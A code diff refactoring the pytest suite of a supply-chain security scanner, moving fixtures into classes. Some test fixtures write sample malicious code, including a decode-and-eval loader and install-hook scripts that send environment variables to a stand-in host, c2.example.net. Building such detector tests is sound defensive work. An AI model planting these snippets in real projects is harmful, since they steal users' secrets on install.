@@ -20,28 +20,35 @@ from cordon_scanner.core.models import Category, Finding, Severity
 from cordon_scanner.detect.base import DetectorRequirements, ScanContext
 
 
-def config(**kw) -> Config:
-    return Config.default().with_overrides(use_cache=False, **kw)
+class EngineHelpers:
+    """Helpers for test_engine.py."""
+
+    @staticmethod
+    def config(**kw) -> Config:
+        return Config.default().with_overrides(use_cache=False, **kw)
 
 
-@pytest.fixture
-def project(tmp_path):
-    root = tmp_path / "repo"
-    (root / "src").mkdir(parents=True)
-    (root / "src" / "app.js").write_text("export const x = 1;\n", encoding="utf-8")
-    (root / "src" / "loader.js").write_text("const p = atob(B);\neval(p);\n", encoding="utf-8")
-    (root / "package.json").write_text(
-        '{"name":"demo","version":"1.0.0","scripts":{"postinstall":"node s.js"},'
-        '"dependencies":{"express":"^4.18.0"}}',
-        encoding="utf-8",
-    )
-    (root / "package-lock.json").write_text(
-        '{"lockfileVersion":3,"packages":{"":{"name":"demo"},'
-        '"node_modules/express":{"version":"4.18.2","integrity":"sha512-a",'
-        '"resolved":"https://registry.npmjs.org/express/-/express-4.18.2.tgz"}}}',
-        encoding="utf-8",
-    )
-    return root
+class EngineFixtures:
+    """Fixtures for the tests in test_engine.py; every test class here inherits them."""
+
+    @pytest.fixture
+    def project(self, tmp_path):
+        root = tmp_path / "repo"
+        (root / "src").mkdir(parents=True)
+        (root / "src" / "app.js").write_text("export const x = 1;\n", encoding="utf-8")
+        (root / "src" / "loader.js").write_text("const p = atob(B);\neval(p);\n", encoding="utf-8")
+        (root / "package.json").write_text(
+            '{"name":"demo","version":"1.0.0","scripts":{"postinstall":"node s.js"},'
+            '"dependencies":{"express":"^4.18.0"}}',
+            encoding="utf-8",
+        )
+        (root / "package-lock.json").write_text(
+            '{"lockfileVersion":3,"packages":{"":{"name":"demo"},'
+            '"node_modules/express":{"version":"4.18.2","integrity":"sha512-a",'
+            '"resolved":"https://registry.npmjs.org/express/-/express-4.18.2.tgz"}}}',
+            encoding="utf-8",
+        )
+        return root
 
 
 # ---------------------------------------------------------------------------
@@ -49,34 +56,34 @@ def project(tmp_path):
 # ---------------------------------------------------------------------------
 
 
-class TestInventory:
+class TestInventory(EngineFixtures):
     def test_identifies_languages_by_byte_weight(self, project) -> None:
         """Byte weighting reflects what a repository is better than file count,
         which over-weights many small config files."""
-        inventory = Scanner(config()).inventory(project)
+        inventory = Scanner(EngineHelpers.config()).inventory(project)
         assert inventory.languages
         sizes = [stat.bytes for stat in inventory.languages]
         assert sizes == sorted(sizes, reverse=True)
 
     def test_records_evidence_for_each_conclusion(self, project) -> None:
         """Inventory that cannot explain itself cannot be debugged when wrong."""
-        inventory = Scanner(config()).inventory(project)
+        inventory = Scanner(EngineHelpers.config()).inventory(project)
         for stat in inventory.languages:
             assert stat.evidence
 
     def test_detects_ecosystems_and_projects(self, project) -> None:
-        inventory = Scanner(config()).inventory(project)
+        inventory = Scanner(EngineHelpers.config()).inventory(project)
         assert "npm" in inventory.ecosystems
         assert any(p.ecosystem == "npm" for p in inventory.projects)
 
     def test_surfaces_manifest_lifecycle_hooks(self, project) -> None:
         """The most useful thing this phase can report: code that runs before
         any other control, invisible from the path alone."""
-        inventory = Scanner(config()).inventory(project)
+        inventory = Scanner(EngineHelpers.config()).inventory(project)
         assert any(h.name == "postinstall" for h in inventory.hooks)
 
     def test_an_empty_directory_is_not_an_error(self, tmp_path) -> None:
-        inventory = Scanner(config()).inventory(tmp_path)
+        inventory = Scanner(EngineHelpers.config()).inventory(tmp_path)
         assert inventory.file_count == 0
         assert inventory.languages == ()
 
@@ -86,25 +93,25 @@ class TestInventory:
 # ---------------------------------------------------------------------------
 
 
-class TestDependencyGraph:
+class TestDependencyGraph(EngineFixtures):
     def test_is_built_from_the_lockfile(self, project) -> None:
-        result = Scanner(config()).scan(project)
+        result = Scanner(EngineHelpers.config()).scan(project)
         assert result.dependencies
         assert any(d.name == "express" for d in result.dependencies)
 
     def test_is_deterministic_and_deduplicated(self, project) -> None:
-        first = Scanner(config()).scan(project).dependencies
-        second = Scanner(config()).scan(project).dependencies
+        first = Scanner(EngineHelpers.config()).scan(project).dependencies
+        second = Scanner(EngineHelpers.config()).scan(project).dependencies
         assert [d.purl for d in first] == [d.purl for d in second]
         assert len({d.purl for d in first}) == len(first)
 
     def test_stats_report_the_dependency_count(self, project) -> None:
-        result = Scanner(config()).scan(project)
+        result = Scanner(EngineHelpers.config()).scan(project)
         assert result.stats.dependencies == len(result.dependencies)
 
     def test_no_lockfile_yields_an_empty_graph(self, tmp_path) -> None:
         (tmp_path / "a.js").write_text("const x = 1;\n", encoding="utf-8")
-        assert Scanner(config()).scan(tmp_path).dependencies == ()
+        assert Scanner(EngineHelpers.config()).scan(tmp_path).dependencies == ()
 
 
 # ---------------------------------------------------------------------------
@@ -112,34 +119,36 @@ class TestDependencyGraph:
 # ---------------------------------------------------------------------------
 
 
-class TestCoverageReporting:
+class TestCoverageReporting(EngineFixtures):
     def test_a_timeout_is_reported_and_marks_the_scan_incomplete(self, project) -> None:
-        result = Scanner(config(limits=Config.default().limits.merged(total_timeout=0.0))).scan(
-            project
-        )
+        result = Scanner(
+            EngineHelpers.config(limits=Config.default().limits.merged(total_timeout=1e-9))
+        ).scan(project)
         assert result.complete is False
         assert any(f.rule_id == "OPERATIONAL.SCAN.TIMEOUT" for f in result.findings)
 
     def test_a_file_limit_is_reported(self, project) -> None:
-        result = Scanner(config(limits=Config.default().limits.merged(max_files=1))).scan(project)
+        result = Scanner(
+            EngineHelpers.config(limits=Config.default().limits.merged(max_files=1))
+        ).scan(project)
         assert result.complete is False
         assert any(f.rule_id == "OPERATIONAL.SCAN.LIMIT" for f in result.findings)
 
     def test_an_exclusion_matching_nothing_is_reported(self, project) -> None:
         """An exclusion for a path that does not exist is a hole held open for
         a file nobody would notice appearing."""
-        result = Scanner(config(exclude=("does-not-exist/",))).scan(project)
+        result = Scanner(EngineHelpers.config(exclude=("does-not-exist/",))).scan(project)
         assert any(f.rule_id == "POLICY.EXCLUDE.UNMATCHED" for f in result.findings)
 
     def test_an_exclusion_that_matches_is_not_reported(self, project) -> None:
-        result = Scanner(config(exclude=("**/*.js",))).scan(project)
+        result = Scanner(EngineHelpers.config(exclude=("**/*.js",))).scan(project)
         assert not [f for f in result.findings if f.rule_id == "POLICY.EXCLUDE.UNMATCHED"]
 
     def test_operational_findings_survive_the_reporting_threshold(self, project) -> None:
         """Hiding them behind a threshold is how a scan that examined almost
         nothing comes to look clean."""
         result = Scanner(
-            config(
+            EngineHelpers.config(
                 severity_threshold=Severity.CRITICAL,
                 limits=Config.default().limits.merged(max_files=1),
             )
@@ -206,17 +215,17 @@ class MisplacedDetector:
         )
 
 
-class TestDetectorContainment:
+class TestDetectorContainment(EngineFixtures):
     def test_a_failing_detector_does_not_abort_the_scan(self, project) -> None:
         """One broken detector silently reducing coverage everywhere is far
         worse than one loud finding saying it broke."""
-        engine = Engine(config(), detectors=[BrokenDetector()])
+        engine = Engine(EngineHelpers.config(), detectors=[BrokenDetector()])
         result = engine.scan(project)
         assert result.complete is False
         assert any(f.rule_id == "OPERATIONAL.DETECTOR.FAILED" for f in result.findings)
 
     def test_the_failure_names_the_detector(self, project) -> None:
-        engine = Engine(config(), detectors=[BrokenDetector()])
+        engine = Engine(EngineHelpers.config(), detectors=[BrokenDetector()])
         failures = [
             f for f in engine.scan(project).findings if f.rule_id == "OPERATIONAL.DETECTOR.FAILED"
         ]
@@ -233,7 +242,7 @@ class TestDetectorContainment:
         first file it touched -- the exact outcome the surrounding method is
         written to prevent.
         """
-        engine = Engine(config(), detectors=[MisplacedDetector()])
+        engine = Engine(EngineHelpers.config(), detectors=[MisplacedDetector()])
         result = engine.scan(project)
 
         assert result.complete is False
@@ -248,9 +257,9 @@ class TestDetectorContainment:
 # ---------------------------------------------------------------------------
 
 
-class TestResultIntegrity:
+class TestResultIntegrity(EngineFixtures):
     def test_the_result_records_what_produced_it(self, project) -> None:
-        result = Scanner(config()).scan(project)
+        result = Scanner(EngineHelpers.config()).scan(project)
         assert result.rulepack_hash
         assert result.config_hash
         assert result.engine_version
@@ -259,28 +268,32 @@ class TestResultIntegrity:
     def test_findings_are_sorted(self, project) -> None:
         findings = [
             f
-            for f in Scanner(config()).scan(project).findings
+            for f in Scanner(EngineHelpers.config()).scan(project).findings
             if f.category is not Category.OPERATIONAL
         ]
         severities = [int(f.severity) for f in findings]
         assert severities == sorted(severities, reverse=True)
 
     def test_disabling_a_detector_removes_its_findings(self, project) -> None:
-        result = Scanner(config(detectors={"manifest": False})).scan(project)
+        result = Scanner(EngineHelpers.config(detectors={"manifest": False})).scan(project)
         assert "manifest" not in {f.detector for f in result.findings}
 
     def test_config_hash_changes_with_configuration(self, project) -> None:
-        a = Scanner(config()).scan(project).config_hash
-        b = Scanner(config(severity_threshold=Severity.CRITICAL)).scan(project).config_hash
+        a = Scanner(EngineHelpers.config()).scan(project).config_hash
+        b = (
+            Scanner(EngineHelpers.config(severity_threshold=Severity.CRITICAL))
+            .scan(project)
+            .config_hash
+        )
         assert a != b
 
     def test_scanning_a_single_file_works(self, project) -> None:
-        result = Scanner(config()).scan(project / "src" / "loader.js")
+        result = Scanner(EngineHelpers.config()).scan(project / "src" / "loader.js")
         assert result.stats.files_scanned == 1
         assert any(f.rule_id == "SUSPECT.DECODE_EXEC.001" for f in result.findings)
 
     def test_scanning_an_empty_directory_is_clean(self, tmp_path) -> None:
-        result = Scanner(config()).scan(tmp_path)
+        result = Scanner(EngineHelpers.config()).scan(tmp_path)
         assert result.findings == ()
         assert result.complete is True
 
@@ -290,7 +303,7 @@ class TestResultIntegrity:
 # ---------------------------------------------------------------------------
 
 
-class TestInstallHookContext:
+class TestInstallHookContext(EngineFixtures):
     def test_manifest_hooks_enter_the_scoring_context(self, tmp_path) -> None:
         """Hooks are discovered while scanning and change how every later
         finding is scored, so they must be folded in before detectors run."""
@@ -302,7 +315,7 @@ class TestInstallHookContext:
             "str(dict(os.environ)).encode())\n",
             encoding="utf-8",
         )
-        result = Scanner(config()).scan(root)
+        result = Scanner(EngineHelpers.config()).scan(root)
         assert any(f.category is Category.MALICIOUS for f in result.findings)
 
     def test_the_same_code_elsewhere_is_not_malicious(self, tmp_path) -> None:
@@ -314,7 +327,7 @@ class TestInstallHookContext:
             "str(dict(os.environ)).encode())\n",
             encoding="utf-8",
         )
-        result = Scanner(config()).scan(root)
+        result = Scanner(EngineHelpers.config()).scan(root)
         assert not [f for f in result.findings if f.category is Category.MALICIOUS]
 
     def test_a_script_a_lifecycle_hook_runs_is_itself_a_hook(self, tmp_path) -> None:
@@ -334,7 +347,7 @@ class TestInstallHookContext:
             "https.request('https://c2.example.net/i').end(JSON.stringify(process.env));\n",
             encoding="utf-8",
         )
-        result = Scanner(config()).scan(root)
+        result = Scanner(EngineHelpers.config()).scan(root)
         hooked = [
             f
             for f in result.findings
@@ -357,7 +370,7 @@ class TestInstallHookContext:
             "https.request('https://c2.example.net/i').end(JSON.stringify(process.env));\n",
             encoding="utf-8",
         )
-        result = Scanner(config()).scan(root)
+        result = Scanner(EngineHelpers.config()).scan(root)
         assert not [f for f in result.findings if f.category is Category.MALICIOUS]
 
     def test_a_command_naming_a_file_outside_the_scan_is_ignored(self, tmp_path) -> None:
@@ -370,11 +383,11 @@ class TestInstallHookContext:
             '"scripts": {"postinstall": "node ../../outside.js"}}',
             encoding="utf-8",
         )
-        result = Scanner(config()).scan(root)
+        result = Scanner(EngineHelpers.config()).scan(root)
         assert result.findings is not None
 
 
-class TestAPolyglotDirectory:
+class TestAPolyglotDirectory(EngineFixtures):
     """One lockfile speaks for its own ecosystem and no other.
 
     Coverage was recorded per project path, so a `requirements.txt` -- which is
@@ -397,7 +410,7 @@ class TestAPolyglotDirectory:
         return root
 
     def test_every_ecosystem_in_it_reaches_the_graph(self, polyglot) -> None:
-        result = Scanner(config()).scan(polyglot)
+        result = Scanner(EngineHelpers.config()).scan(polyglot)
         assert {d.ecosystem for d in result.dependencies} == {"pypi", "conan", "conda"}
 
     def test_a_lockfile_still_supersedes_its_own_manifest(self, tmp_path) -> None:
@@ -413,13 +426,13 @@ class TestAPolyglotDirectory:
             '"node_modules/lodash":{"version":"4.17.21"}}}',
             encoding="utf-8",
         )
-        result = Scanner(config()).scan(root)
+        result = Scanner(EngineHelpers.config()).scan(root)
         lodash = [d for d in result.dependencies if d.name == "lodash"]
         assert len(lodash) == 1
         assert lodash[0].version == "4.17.21", "the resolved entry must win, not the range"
 
 
-class TestAnEcosystemWithNoAdvisoryFeed:
+class TestAnEcosystemWithNoAdvisoryFeed(EngineFixtures):
     """Parsed, graphed, and impossible to match -- so the scan says so.
 
     OSV publishes no export for Conan, conda, Bazel or CocoaPods. Those
@@ -438,18 +451,18 @@ class TestAnEcosystemWithNoAdvisoryFeed:
         return root
 
     def test_the_uncovered_ecosystem_is_named(self, conan_project) -> None:
-        result = Scanner(config()).scan(conan_project)
+        result = Scanner(EngineHelpers.config()).scan(conan_project)
         notes = [f for f in result.findings if f.rule_id == "OPERATIONAL.ADVISORY.NO_FEED.001"]
         assert len(notes) == 1
         assert "conan" in notes[0].message
 
     def test_it_counts_as_a_loss_of_coverage(self, conan_project) -> None:
         """`complete` is the flag a pipeline reads to know the answer is partial."""
-        assert Scanner(config()).scan(conan_project).complete is False
+        assert Scanner(EngineHelpers.config()).scan(conan_project).complete is False
 
     def test_an_ecosystem_with_a_feed_produces_no_such_note(self, tmp_path) -> None:
         root = tmp_path / "py"
         root.mkdir()
         (root / "requirements.txt").write_text("django==3.2\n", encoding="utf-8")
-        result = Scanner(config()).scan(root)
+        result = Scanner(EngineHelpers.config()).scan(root)
         assert not [f for f in result.findings if f.rule_id == "OPERATIONAL.ADVISORY.NO_FEED.001"]
